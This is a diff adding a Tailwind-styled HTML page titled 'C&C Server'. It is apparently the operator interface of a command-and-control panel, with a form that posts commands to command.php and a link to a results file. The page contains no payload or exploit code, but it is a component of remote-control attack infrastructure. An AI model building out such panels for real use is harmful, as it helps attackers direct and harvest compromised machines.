@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C&C Server</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-900 text-white flex flex-col items-center justify-center min-h-screen">
+    <h1 class="text-4xl font-bold mb-6">C&C Server</h1>
+    
+    <div class="bg-gray-800 p-6 rounded-lg shadow-lg w-96">
+        <h2 class="text-2xl font-semibold mb-4"></h2>
+        <form action="command.php" method="POST" class="flex flex-col">
+            <input type="text" name="command" placeholder="COMMEND" 
+                   class="p-2 rounded bg-gray-700 text-white focus:outline-none focus:ring-2 focus:ring-blue-500">
+            <button type="submit" class="mt-4 bg-blue-600 hover:bg-blue-500 text-white font-bold py-2 px-4 rounded-lg">
+                SEND
+            </button>
+        </form>
+    </div>
+    
+    <div class="bg-gray-800 p-6 rounded-lg shadow-lg w-96 mt-6 text-center">
+        <h2 class="text-2xl font-semibold mb-4">VIEW RESULT</h2>
+        <a href="upload/results.txt" target="_blank" 
+           class="bg-green-600 hover:bg-green-500 text-white font-bold py-2 px-4 rounded-lg inline-block">
+            RESULT
+        </a>
+    </div>
+</body>
+</html>
